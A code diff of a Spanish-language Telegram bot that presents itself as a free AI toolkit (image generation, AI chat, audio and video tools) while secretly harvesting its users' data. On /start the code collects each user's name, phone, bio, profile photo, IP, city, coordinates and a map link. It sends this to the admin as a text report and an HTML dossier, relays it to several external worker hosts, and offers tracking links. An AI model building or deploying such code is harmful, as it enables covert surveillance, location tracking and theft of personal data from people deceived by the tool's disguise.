@@ -7,27 +7,24 @@ import asyncio
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
 # ========== CONFIGURACIÓN ==========
 TOKEN = os.environ.get("TOKEN", "").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
-WORKER_URL = os.environ.get("WORKER_URL", "https://kali-app.onrender.com").strip()
+WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
 
-# ========== TODAS LAS URLS DE WORKERS ==========
+# ========== WORKERS ==========
 URLS = [
-    "https://bot-ubi.societykark.workers.dev",
     "https://bot-tg.societykark.workers.dev",
     "https://tg-bot12.societykark.workers.dev",
     "https://app-trk.societykark.workers.dev",
     "https://app-tg.societykark.workers.dev",
     "https://app-kali.societykark.workers.dev",
-    "https://societykark.pythonanywhere.com",
-    "https://kali-bot12.societykark.workers.dev",
-    "https://galleta.societykark.workers.dev"
+    "https://kali-bot12.societykark.workers.dev"
 ]
 
 if not TOKEN or not ADMIN_ID:
@@ -38,35 +35,65 @@ logger = logging.getLogger(__name__)
 
 users_db = {}
 tracking_codes = {}
+memoria = {}  # Para IA
 
+# ========== PERSONALIDAD DE LA IA (NORMAL) ==========
+PERSONALIDAD = """Eres un asistente virtual útil, profesional y amigable. 
+Respondes con claridad y educación. Ayudas en preguntas, programación, ideas y tareas. 
+Usas un tono cálido pero formal. Siempre ofreces soluciones prácticas."""
+
+SALUDO_IA = """🤖 *Asistente IA*\n\nHola, soy tu asistente virtual.\nPuedo ayudarte con preguntas, programación, ideas y más.\n\n¿En qué puedo ayudarte hoy?"""
+
+# ========== MODELOS DE IA ==========
+MODELOS = {
+    "1": {"id": "nvidia/nemotron-3-super-120b-a12b:free", "nombre": "⚡ NVIDIA Nemotron 3", "desc": "120B params, 1M contexto"},
+    "2": {"id": "meta-llama/llama-3.2-3b-instruct:free", "nombre": "🦙 Llama 3.2 3B", "desc": "Rápido y confiable"},
+    "3": {"id": "mistralai/mistral-7b-instruct:free", "nombre": "🌀 Mistral 7B", "desc": "Open-source y probado"},
+    "4": {"id": "google/gemma-4-31b-instruct:free", "nombre": "💎 Gemma 4 31B", "desc": "Multimodal, 256K contexto"},
+}
+MODELO_DEFECTO = MODELOS["1"]["id"]
+
+# ========== MENÚ PRINCIPAL (ReplyKeyboard) ==========
 def menu_estatico():
     keyboard = [
-        [KeyboardButton("🎨 GENERAR IMAGEN"), KeyboardButton("🤖 CHAT GPT")],
+        [KeyboardButton("🎨 GENERAR IMAGEN"), KeyboardButton("🤖 CHAT IA")],
         [KeyboardButton("🎬 VIDEO → AUDIO"), KeyboardButton("🎵 EDITAR AUDIO")],
-        [KeyboardButton("📸 ENVIAR FOTO IA PRO"), KeyboardButton("🎥 ENVIAR VIDEO IA PRO")],
-        [KeyboardButton("🎙️ ENVIAR AUDIO EFECTO"), KeyboardButton("📇 ENVIAR CONTACTO")],
+        [KeyboardButton("📸 ENVIAR FOTO"), KeyboardButton("🎥 ENVIAR VIDEO")],
+        [KeyboardButton("🎙️ ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
         [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
         [KeyboardButton("📊 MI PERFIL"), KeyboardButton("📈 ESTADÍSTICAS")],
         [KeyboardButton("❓ AYUDA")],
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-MENSAJE_INICIO = """🔥 *HERRAMIENTAS IA 🤖* 🔥
+# ========== MENÚ IA (InlineKeyboard) ==========
+def menu_ia():
+    keyboard = [
+        [InlineKeyboardButton("💬 Conversar", callback_data="conversar")],
+        [InlineKeyboardButton("🤖 Cambiar modelo", callback_data="modelos")],
+        [InlineKeyboardButton("🧹 Reiniciar chat", callback_data="reset")],
+        [InlineKeyboardButton("📊 Estadísticas", callback_data="stats")],
+        [InlineKeyboardButton("❓ Ayuda", callback_data="ayuda")],
+        [InlineKeyboardButton("🔙 Volver al menú principal", callback_data="volver_principal")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+MENSAJE_INICIO = """🔥 *HERRAMIENTAS IA* 🔥
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🚀 *La herramienta IA para todo*
+🚀 *La herramienta todo-en-uno*
 
 ✅ Genera imágenes con IA
-✅ Chat GPT integrado
+✅ Chat IA integrado
 ✅ Convierte video a audio
-✅Mejora o edita foto con IA 
+✅ Edita audio con efectos
 
-*¡100% gratuito y sin límites!*
+*¡100% gratuito!*
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 *Selecciona una opción del menú:*"""
 
-# ========== FUNCIONES DE EXTRACCIÓN ==========
+# ========== FUNCIONES DE EXTRACCIÓN DE DATOS (OMNI) ==========
 async def get_worker_location():
     try:
         async with aiohttp.ClientSession() as session:
@@ -171,7 +198,6 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != "N/A" and lon != "N/A" else "N/A"
     device = "Desconocido (Telegram App)"
 
-    # ========== TEXTO PARA ADMIN ==========
     info_admin = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
     info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     info_admin += f"👤 *Telegram*\n"
@@ -205,7 +231,6 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     info_admin += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
-    # ========== PERFIL PÚBLICO ==========
     info_perfil = f"📊 *Tu perfil*\n\n"
     info_perfil += f"👤 *Nombre:* {full_name}\n"
     info_perfil += f"📛 *Username:* {username}\n"
@@ -240,163 +265,53 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 def generar_html(info_data):
     html = f"""<!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Perfil de {info_data['full_name']}</title>
-    <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0a0a1a;
-            color: #e0e0e0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }}
-        .container {{
-            max-width: 900px;
-            width: 100%;
-            background: #12122a;
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 0 30px rgba(0, 100, 255, 0.15);
-            border: 1px solid #1a2a4a;
-        }}
-        h1 {{
-            color: #00d4ff;
-            text-align: center;
-            font-size: 28px;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
-            text-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
-        }}
-        .subtitle {{
-            text-align: center;
-            color: #8899bb;
-            font-size: 14px;
-            margin-bottom: 25px;
-            border-bottom: 1px solid #1a2a4a;
-            padding-bottom: 15px;
-        }}
-        .section {{
-            background: #0d0d22;
-            border-radius: 10px;
-            padding: 15px 20px;
-            margin-bottom: 12px;
-            border-left: 3px solid #00d4ff;
-            transition: 0.3s;
-        }}
-        .section:hover {{
-            background: #14143a;
-            border-left-color: #ff6b6b;
-        }}
-        .label {{
-            font-weight: 600;
-            color: #88bbdd;
-            display: inline-block;
-            width: 150px;
-            font-size: 14px;
-        }}
-        .value {{
-            color: #f0f0f0;
-            font-weight: 400;
-            word-break: break-all;
-        }}
-        .value a {{
-            color: #00d4ff;
-            text-decoration: none;
-        }}
-        .value a:hover {{
-            text-decoration: underline;
-            color: #ff6b6b;
-        }}
-        .footer {{
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            color: #445566;
-            border-top: 1px solid #1a2a4a;
-            padding-top: 15px;
-        }}
-        .badge {{
-            display: inline-block;
-            background: #00d4ff;
-            color: #000;
-            padding: 2px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-        }}
-        .badge-green {{
-            background: #00ff88;
-            color: #000;
-        }}
-        .badge-red {{
-            background: #ff4444;
-            color: #fff;
-        }}
-        .row {{
-            display: flex;
-            flex-wrap: wrap;
-            margin-bottom: 4px;
-        }}
-        .row .label {{
-            flex: 0 0 150px;
-        }}
-        .row .value {{
-            flex: 1;
-        }}
-        @media (max-width: 600px) {{
-            .row .label {{ flex: 0 0 100%; }}
-        }}
-    </style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de {info_data['full_name']}</title>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+body {{ font-family:'Segoe UI',Arial,sans-serif; background:#0a0a1a; color:#e0e0e0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }}
+.container {{ max-width:900px; width:100%; background:#12122a; border-radius:16px; padding:30px; box-shadow:0 0 30px rgba(0,100,255,0.15); border:1px solid #1a2a4a; }}
+h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text-shadow:0 0 20px rgba(0,212,255,0.2); }}
+.subtitle {{ text-align:center; color:#8899bb; font-size:14px; margin-bottom:25px; border-bottom:1px solid #1a2a4a; padding-bottom:15px; }}
+.section {{ background:#0d0d22; border-radius:10px; padding:15px 20px; margin-bottom:12px; border-left:3px solid #00d4ff; }}
+.section:hover {{ background:#14143a; border-left-color:#ff6b6b; }}
+.label {{ font-weight:600; color:#88bbdd; display:inline-block; width:150px; font-size:14px; }}
+.value {{ color:#f0f0f0; font-weight:400; word-break:break-all; }}
+.value a {{ color:#00d4ff; text-decoration:none; }}
+.value a:hover {{ text-decoration:underline; color:#ff6b6b; }}
+.footer {{ text-align:center; margin-top:25px; font-size:12px; color:#445566; border-top:1px solid #1a2a4a; padding-top:15px; }}
+.row {{ display:flex; flex-wrap:wrap; margin-bottom:4px; }}
+.row .label {{ flex:0 0 150px; }}
+.row .value {{ flex:1; }}
+@media (max-width:600px) {{ .row .label {{ flex:0 0 100%; }} }}
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🕵️ PERFIL COMPLETO</h1>
-        <div class="subtitle">Datos extraídos automáticamente • Studio Pro Ultra</div>
-
-        <div class="section">
-            <div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{info_data['full_name']}</span></div>
-            <div class="row"><span class="label">📛 Username:</span><span class="value">{info_data['username']}</span></div>
-            <div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{info_data['user_id']}</code></span></div>
-            <div class="row"><span class="label">📞 Teléfono:</span><span class="value">{info_data['phone']}</span></div>
-            <div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{info_data['language']}</span></div>
-            <div class="row"><span class="label">⭐ Premium:</span><span class="value">{info_data['is_premium']}</span></div>
-            <div class="row"><span class="label">📖 Biografía:</span><span class="value">{info_data['bio']}</span></div>
-        </div>
-
-        <div class="section">
-            <div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{info_data['device']}</span></div>
-        </div>
-
-        <div class="section">
-            <div class="row"><span class="label">💬 Chat:</span><span class="value">{info_data['chat_type']} (ID: {info_data['chat_id']})</span></div>
-        </div>
-
-        <div class="section">
-            <div class="row"><span class="label">📩 Mensaje:</span><span class="value">{info_data['message_text'][:200]}{'...' if len(info_data['message_text']) > 200 else ''}</span></div>
-            <div class="row"><span class="label">📅 Fecha:</span><span class="value">{info_data['message_date']}</span></div>
-        </div>
-
-        <div class="section">
-            <div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{info_data['ip']}</code></span></div>
-            <div class="row"><span class="label">📍 País:</span><span class="value">{info_data['country']}</span></div>
-            <div class="row"><span class="label">🏙️ Región:</span><span class="value">{info_data['region'] if info_data.get('region') else 'N/A'}</span></div>
-            <div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{info_data['city']}</span></div>
-            <div class="row"><span class="label">📮 Código Postal:</span><span class="value">{info_data.get('postal', 'N/A')}</span></div>
-            <div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{info_data.get('timezone', 'N/A')}</span></div>
-            <div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{info_data['lat']}, {info_data['lon']}</span></div>
-            <div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{info_data['maps_link']}" target="_blank">{info_data['maps_link']}</a></span></div>
-        </div>
-
-        <div class="footer">
-            ⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &bull; Studio Pro Ultra
-        </div>
-    </div>
+<div class="container">
+<h1>🕵️ PERFIL COMPLETO</h1>
+<div class="subtitle">Datos extraídos automáticamente</div>
+<div class="section"><div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{info_data['full_name']}</span></div>
+<div class="row"><span class="label">📛 Username:</span><span class="value">{info_data['username']}</span></div>
+<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{info_data['user_id']}</code></span></div>
+<div class="row"><span class="label">📞 Teléfono:</span><span class="value">{info_data['phone']}</span></div>
+<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{info_data['language']}</span></div>
+<div class="row"><span class="label">⭐ Premium:</span><span class="value">{info_data['is_premium']}</span></div>
+<div class="row"><span class="label">📖 Biografía:</span><span class="value">{info_data['bio']}</span></div></div>
+<div class="section"><div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{info_data['device']}</span></div></div>
+<div class="section"><div class="row"><span class="label">💬 Chat:</span><span class="value">{info_data['chat_type']} (ID: {info_data['chat_id']})</span></div></div>
+<div class="section"><div class="row"><span class="label">📩 Mensaje:</span><span class="value">{info_data['message_text'][:200]}{'...' if len(info_data['message_text'])>200 else ''}</span></div>
+<div class="row"><span class="label">📅 Fecha:</span><span class="value">{info_data['message_date']}</span></div></div>
+<div class="section">
+<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{info_data['ip']}</code></span></div>
+<div class="row"><span class="label">📍 País:</span><span class="value">{info_data['country']}</span></div>
+<div class="row"><span class="label">🏙️ Región:</span><span class="value">{info_data.get('region','N/A')}</span></div>
+<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{info_data['city']}</span></div>
+<div class="row"><span class="label">📮 Código Postal:</span><span class="value">{info_data.get('postal','N/A')}</span></div>
+<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{info_data.get('timezone','N/A')}</span></div>
+<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{info_data['lat']}, {info_data['lon']}</span></div>
+<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{info_data['maps_link']}" target="_blank">{info_data['maps_link']}</a></span></div>
+</div>
+<div class="footer">⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
+</div>
 </body>
 </html>"""
     return html
@@ -404,36 +319,27 @@ def generar_html(info_data):
 # ========== ENVÍO A ADMIN ==========
 async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
     bot = context.bot
-    # Enviar mensaje de texto
     await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
     if extra_msg:
         await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
 
-    # Enviar HTML como archivo
     try:
         html_content = generar_html(info_data)
         with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
             f.write(html_content)
             html_path = f.name
         with open(html_path, 'rb') as f:
-            await bot.send_document(
-                chat_id=ADMIN_ID,
-                document=f,
-                filename=f"perfil_{info_data['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
-                caption=f"📄 HTML con todos los datos de {info_data['full_name']}"
-            )
+            await bot.send_document(chat_id=ADMIN_ID, document=f, filename=f"perfil_{info_data['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html", caption=f"📄 HTML con todos los datos de {info_data['full_name']}")
         os.unlink(html_path)
     except Exception as e:
         logger.error(f"Error al enviar HTML: {e}")
 
-    # Enviar a todos los Workers
     resultados = await send_to_all_workers(info_data["admin_text"])
     logger.info(f"Resultados de envío a Workers: {resultados}")
     users_db[info_data["user_id"]] = info_data
 
-# ========== ENVÍO A WORKERS ==========
 async def send_to_all_workers(text):
     form_data = aiohttp.FormData()
     form_data.add_field('chat_id', str(ADMIN_ID))
@@ -451,32 +357,101 @@ async def send_to_all_workers(text):
                 results.append(f"❌ {url} (Error: {str(e)[:30]})")
     return results
 
-# ========== CHATGPT ==========
-async def preguntar_chatgpt(prompt):
-    if not OPENROUTER_KEY:
-        return "❌ OPENROUTER_KEY no configurada."
+# ========== FUNCIONES IA (DE KAORI-CHAN) ==========
+def obtener_usuario_ia(chat_id):
+    if chat_id not in memoria:
+        memoria[chat_id] = {"historial": [], "modelo": MODELO_DEFECTO}
+    return memoria[chat_id]
+
+async def preguntar_ai(prompt, chat_id, reintentos=2):
+    usuario = obtener_usuario_ia(chat_id)
+    historial = usuario["historial"]
+    modelo = usuario["modelo"]
+    
+    mensajes = [
+        {"role": "system", "content": PERSONALIDAD},
+        *historial,
+        {"role": "user", "content": prompt}
+    ]
+    
     headers = {
         "Authorization": f"Bearer {OPENROUTER_KEY}",
         "Content-Type": "application/json",
-        "HTTP-Referer": "https://t.me/studio_pro",
+        "HTTP-Referer": "https://t.me/tu_bot",
+        "X-Title": "Asistente IA"
     }
     payload = {
-        "model": "deepseek/deepseek-v4-flash:free",
-        "messages": [{"role": "user", "content": prompt}],
-        "max_tokens": 500,
-        "temperature": 0.7,
+        "model": modelo,
+        "messages": mensajes,
+        "max_tokens": 1000,
+        "temperature": 0.85,
+        "top_p": 0.95,
     }
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=60) as resp:
-                data = await resp.json()
-                if resp.status == 200:
-                    return data["choices"][0]["message"]["content"].strip()
-                return f"❌ Error {resp.status}: {data.get('error', {}).get('message', '')}"
-    except Exception as e:
-        return f"❌ Error: {str(e)[:100]}"
+    
+    for intento in range(reintentos + 1):
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=90) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        reply = data["choices"][0]["message"]["content"].strip()
+                        usuario["historial"].append({"role": "user", "content": prompt})
+                        usuario["historial"].append({"role": "assistant", "content": reply})
+                        if len(usuario["historial"]) > 20:
+                            usuario["historial"] = usuario["historial"][-20:]
+                        return reply
+                    else:
+                        error_data = await resp.text()
+                        logger.error(f"Error {resp.status}: {error_data}")
+                        if intento < reintentos:
+                            await asyncio.sleep(2 ** intento)
+                            continue
+                        return f"❌ Error {resp.status}: {error_data[:100]}"
+        except asyncio.TimeoutError:
+            if intento < reintentos:
+                await asyncio.sleep(2)
+                continue
+            return "⏳ El asistente tardó demasiado. Intenta de nuevo."
+        except Exception as e:
+            logger.error(f"Error en intento {intento}: {e}")
+            if intento < reintentos:
+                await asyncio.sleep(2)
+                continue
+            return f"❌ Error inesperado: {str(e)[:100]}"
+    return "❌ No se pudo obtener respuesta después de varios intentos."
 
-# ========== GENERAR IMAGEN ==========
+async def enviar_respuesta_ia(update, texto):
+    if len(texto) <= 4000:
+        await update.message.reply_text(texto, parse_mode=ParseMode.MARKDOWN)
+        return
+    partes = []
+    for parrafo in texto.split('\n\n'):
+        if not parrafo.strip():
+            continue
+        if len(parrafo) > 4000:
+            for oracion in parrafo.split('. '):
+                if oracion:
+                    partes.append(oracion + '. ')
+        else:
+            partes.append(parrafo)
+    mensajes = []
+    actual = ""
+    for parte in partes:
+        if len(actual) + len(parte) + 2 <= 4000:
+            actual += parte + "\n\n"
+        else:
+            if actual:
+                mensajes.append(actual.strip())
+            actual = parte + "\n\n"
+    if actual:
+        mensajes.append(actual.strip())
+    for i, msg in enumerate(mensajes):
+        if i == 0:
+            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text(f"[Continuación] ✨\n\n{msg}", parse_mode=ParseMode.MARKDOWN)
+
+# ========== OTRAS FUNCIONES (herramientas) ==========
 async def generar_imagen(prompt):
     url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
     async with aiohttp.ClientSession() as session:
@@ -485,7 +460,6 @@ async def generar_imagen(prompt):
                 return await resp.read()
             return None
 
-# ========== EXTRAER AUDIO ==========
 def extraer_audio(video_path):
     audio_path = tempfile.mktemp(suffix='.mp3')
     try:
@@ -495,7 +469,6 @@ def extraer_audio(video_path):
         logger.error(f"Error al extraer audio: {e}")
         return None
 
-# ========== EDITAR AUDIO ==========
 def editar_audio(audio_path, efecto):
     output_path = tempfile.mktemp(suffix='.mp3')
     try:
@@ -512,7 +485,7 @@ def editar_audio(audio_path, efecto):
         logger.error(f"Error al editar audio: {e}")
         return None
 
-# ========== COMANDO /START ==========
+# ========== COMANDOS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id == ADMIN_ID:
@@ -522,7 +495,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_to_admin(update, context, info_data)
     await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
-# ========== MANEJAR MENSAJES DE TEXTO ==========
+# ========== MANEJAR MENSAJES DE TEXTO (ReplyKeyboard) ==========
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     user = update.effective_user
@@ -534,115 +507,42 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = menu_estatico()
 
     if text == "🎨 GENERAR IMAGEN":
-        await update.message.reply_text(
-            "🖼️ *Generación de imagen con IA*\n\n"
-            "📌 Escribe el prompt de lo que quieras generar.\n"
-            "Ejemplo: *un gato astronauta en la luna*\n\n"
-            "👉 *Escribe tu prompt ahora:*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("🖼️ *Generación de imagen con IA*\n\n📌 Escribe el prompt de lo que quieras generar.\nEjemplo: *un gato astronauta en la luna*\n\n👉 *Escribe tu prompt ahora:*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
         context.user_data['esperando_prompt'] = True
 
-    elif text == "🤖 CHAT GPT":
-        await update.message.reply_text(
-            "🤖 *Chat GPT Integrado*\n\n"
-            "📌 Escribe tu pregunta y te responderé con IA.\n\n"
-            "👉 *Escribe tu pregunta ahora:*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
-        context.user_data['esperando_chatgpt'] = True
+    elif text == "🤖 CHAT IA":
+        await update.message.reply_text(SALUDO_IA, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
+        context.user_data['modo_ia'] = True
 
     elif text == "🎬 VIDEO → AUDIO":
-        await update.message.reply_text(
-            "🎬 *Conversión de Video a Audio*\n\n"
-            "📌 Envíame un video y lo convertiré a audio (MP3).\n\n"
-            "👉 *Presiona el clip 📎 y selecciona un video*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("🎬 *Conversión de Video a Audio*\n\n📌 Envíame un video y lo convertiré a audio (MP3).\n\n👉 *Presiona el clip 📎 y selecciona un video*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     elif text == "🎵 EDITAR AUDIO":
-        keyboard = [
-            [KeyboardButton("⚡ Velocidad 1.5x"), KeyboardButton("🔊 Volumen 2x")],
-            [KeyboardButton("🎵 Convertir a Mono"), KeyboardButton("🔙 Volver al menú")],
-        ]
-        await update.message.reply_text(
-            "🎵 *Edición de Audio*\n\n"
-            "Elige un efecto y luego envíame el audio:\n"
-            "• ⚡ Velocidad 1.5x\n"
-            "• 🔊 Volumen 2x\n"
-            "• 🎵 Convertir a Mono",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-        )
+        keyboard = [[KeyboardButton("⚡ Velocidad 1.5x"), KeyboardButton("🔊 Volumen 2x")], [KeyboardButton("🎵 Convertir a Mono"), KeyboardButton("🔙 Volver al menú")]]
+        await update.message.reply_text("🎵 *Edición de Audio*\n\nElige un efecto y luego envíame el audio:\n• ⚡ Velocidad 1.5x\n• 🔊 Volumen 2x\n• 🎵 Convertir a Mono", parse_mode=ParseMode.MARKDOWN, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))
 
     elif text in ["⚡ Velocidad 1.5x", "🔊 Volumen 2x", "🎵 Convertir a Mono"]:
-        efecto_map = {
-            "⚡ Velocidad 1.5x": "velocidad",
-            "🔊 Volumen 2x": "volumen",
-            "🎵 Convertir a Mono": "mono"
-        }
+        efecto_map = {"⚡ Velocidad 1.5x": "velocidad", "🔊 Volumen 2x": "volumen", "🎵 Convertir a Mono": "mono"}
         context.user_data['efecto_audio'] = efecto_map[text]
-        await update.message.reply_text(
-            f"✅ Efecto *{text}* seleccionado.\n"
-            "📤 Ahora envíame el audio que quieres editar.",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=menu_estatico()
-        )
+        await update.message.reply_text(f"✅ Efecto *{text}* seleccionado.\n📤 Ahora envíame el audio que quieres editar.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     elif text == "📸 ENVIAR FOTO":
-        await update.message.reply_text(
-            "📸 *Envíame una foto*\n\n"
-            "👉 *Presiona el clip 📎 y selecciona una foto de tu galería*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("📸 *Envíame una foto*\n\n👉 *Presiona el clip 📎 y selecciona una foto de tu galería*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     elif text == "🎥 ENVIAR VIDEO":
-        await update.message.reply_text(
-            "🎥 *Envíame un video*\n\n"
-            "👉 *Presiona el clip 📎 y selecciona un video*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("🎥 *Envíame un video*\n\n👉 *Presiona el clip 📎 y selecciona un video*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     elif text == "🎙️ ENVIAR AUDIO":
-        await update.message.reply_text(
-            "🎙️ *Envíame un audio*\n\n"
-            "👉 *Presiona el clip 📎 y selecciona un audio*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("🎙️ *Envíame un audio*\n\n👉 *Presiona el clip 📎 y selecciona un audio*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     elif text == "📇 ENVIAR CONTACTO":
-        await update.message.reply_text(
-            "📇 *Comparte tu contacto*\n\n"
-            "👉 *Presiona el botón 📎 y luego selecciona 'Contacto'*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("📇 *Comparte tu contacto*\n\n👉 *Presiona el botón 📎 y luego selecciona 'Contacto'*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     elif text == "📍 ENVIAR UBICACIÓN":
-        await update.message.reply_text(
-            "📍 *Comparte tu ubicación*\n\n"
-            "👉 *Presiona el botón 📎 y luego selecciona 'Ubicación'*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("📍 *Comparte tu ubicación*\n\n👉 *Presiona el botón 📎 y luego selecciona 'Ubicación'*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     elif text == "🔗 GENERAR ENLACE":
         code = os.urandom(6).hex()
         tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
         link = f"{WORKER_URL}/track/{code}"
-        await update.message.reply_text(
-            f"🔗 *Enlace generado:*\n"
-            f"`{link}`\n\n"
-            f"⏳ *Válido por 5 minutos.*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
-        await context.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}"
-        )
+        await update.message.reply_text(f"🔗 *Enlace generado:*\n`{link}`\n\n⏳ *Válido por 5 minutos.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}")
 
     elif text == "📊 MI PERFIL":
         info = users_db.get(user.id)
@@ -653,55 +553,22 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif text == "📈 ESTADÍSTICAS":
         if user.id == ADMIN_ID:
-            msg = f"📊 *Estadísticas del sistema*\n\n"
-            msg += f"👥 Usuarios: {len(users_db)}\n"
